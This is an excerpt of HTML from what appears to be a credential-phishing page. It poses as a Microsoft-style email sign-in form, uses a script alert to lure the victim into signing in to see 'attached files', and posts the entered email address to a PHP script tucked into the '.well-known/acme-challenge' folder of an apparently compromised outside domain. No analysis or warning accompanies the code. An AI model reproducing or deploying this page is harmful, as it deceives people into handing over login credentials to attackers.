...
<script> 
alert("To access the attached files, Sign in using your email address")
</script>
...
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-gr-c-s-loaded="true">
    ...
    <div>
        ...
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="http://advantech-uae.com/.well-known/acme-challenge/vvv.php" onsubmit="return checkSubmit()">
                                        ...
                                        <div class="row">
                                            ...
                                            <div class="form-group col-md-24">
                                                ...
                                                <div class="placeholderContainer" id="emField">
                                                    ...
                                                    <input type="email" name="email" id="i0116" value="" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" placeholder="Email Address" aria-label="Enter your email address." required="" autofocus="true">
